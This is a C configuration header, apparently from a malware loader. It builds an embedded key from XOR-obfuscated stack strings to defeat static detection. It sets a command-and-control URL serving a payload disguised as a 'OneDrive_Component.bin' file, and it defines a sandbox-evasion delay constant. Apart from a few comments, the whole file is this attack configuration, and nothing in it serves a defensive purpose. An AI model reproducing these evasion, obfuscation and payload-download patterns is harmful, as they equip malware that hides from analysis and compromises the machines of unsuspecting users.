#ifndef CONFIG_H
#define CONFIG_H

// macro generated for key: '_sup3s3cr3tk3y_'
// NOTE: use /helper/stack_string.py to generate macro for your own key
#define LOAD_GLOBAL_KEY(key_var, len_var) \
    char key_var[16]; \
    key_var[0] = 0xBA ^ 0xE5; \
    key_var[1] = 0xCB ^ 0xB8; \
    key_var[2] = 0x60 ^ 0x15; \
    key_var[3] = 0xC2 ^ 0xB2; \
    key_var[4] = 0x70 ^ 0x43; \
    key_var[5] = 0x5F ^ 0x2C; \
    key_var[6] = 0x9A ^ 0xA9; \
    key_var[7] = 0x57 ^ 0x34; \
    key_var[8] = 0x61 ^ 0x13; \
    key_var[9] = 0xB4 ^ 0x87; \
    key_var[10] = 0x91 ^ 0xE5; \
    key_var[11] = 0xBE ^ 0xD5; \
    key_var[12] = 0xC2 ^ 0xF1; \
    key_var[13] = 0x6F ^ 0x16; \
    key_var[14] = 0xBF ^ 0xE0; \
    key_var[15] = 0x00; \
    size_t len_var = 15;

// TODO: encode C2 URL
#define C2_URL "http://192.168.122.235:8080/OneDrive_Component.bin"

#define SANDBOX_DELAY_CYCLES 500000000

#endif
